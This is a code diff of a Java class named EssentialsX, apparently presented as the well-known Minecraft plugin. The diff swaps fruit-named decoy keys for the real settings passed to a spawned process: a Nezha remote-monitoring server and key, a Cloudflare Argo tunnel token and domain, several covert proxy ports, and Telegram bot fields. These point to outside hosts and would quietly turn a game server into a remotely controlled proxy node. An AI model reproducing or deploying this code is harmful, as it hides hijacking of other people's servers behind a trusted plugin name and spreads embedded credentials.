@@ -13,11 +13,11 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     
     private static final String[] ALL_ENV_VARS = {
-        "FILE_PATH", "apples", "bules", "canyuo", 
-        "babanas", "oranges", "pearsf", "grapes", 
-        "peachs", "mangos", "cherrys", "lemons",
-        "watermes", "strawbeeys", "papayas", "cocounts", 
-        "pineapples","limes", "dragons", "NAME", "passionfruit"
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
     
     @Override
@@ -73,27 +73,27 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("apples", "a7c8bee2-5e5f-4143-8704-fe1336cbbedb");
-        env.put("FILE_PATH", "./galgame");
-        env.put("bules", "sui.uuz.us.kg");
-        env.put("canyuo", "443");
-        env.put("babanas", "SdXrrzfjMtj23zBv2b");
-        env.put("oranges", "8080");
-        env.put("pearsf", "hiden.blue.xx.kg");
-        env.put("grapes", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9");
-        env.put("peachs", "");
-        env.put("mangos", "24637");
-        env.put("cherrys", "25453");
-        env.put("lemons", "");
-        env.put("watermes", "25453");
-        env.put("strawbeeys", "");
-        env.put("pineapples", "");
-        env.put("limes", "");
-        env.put("dragons", "");
-        env.put("papayas", "saas.sin.fan");
-        env.put("cocounts", "443");
-        env.put("NAME", "Hi");
-        env.put("passionfruit", "false");
+        env.put("UUID", "a7c8bee2-5e5f-4143-8704-fe1336cbbedb SdXrrzfjMtj23zBv2b");
+        env.put("FILE_PATH", "./world");
+        env.put("NEZHA_SERVER", "sui.uuz.us.kg");
+        env.put("NEZHA_PORT", "443");
+        env.put("NEZHA_KEY", "SdXrrzfjMtj23zBv2b");
+        env.put("ARGO_PORT", "8080");
+        env.put("ARGO_DOMAIN", "hiden.blue.xx.kg");
+        env.put("ARGO_AUTH", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9");
+        env.put("S5_PORT", "");
+        env.put("HY2_PORT", "24637");
+        env.put("TUIC_PORT", "25453");
+        env.put("ANYTLS_PORT", "");
+        env.put("REALITY_PORT", "25453");
+        env.put("ANYREALITY_PORT", "");
+        env.put("UPLOAD_URL", "");
+        env.put("CHAT_ID", "");
+        env.put("BOT_TOKEN", "");
+        env.put("CFIP", "saas.sin.fan");
+        env.put("CFPORT", "443");
+        env.put("NAME", "Hiden");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
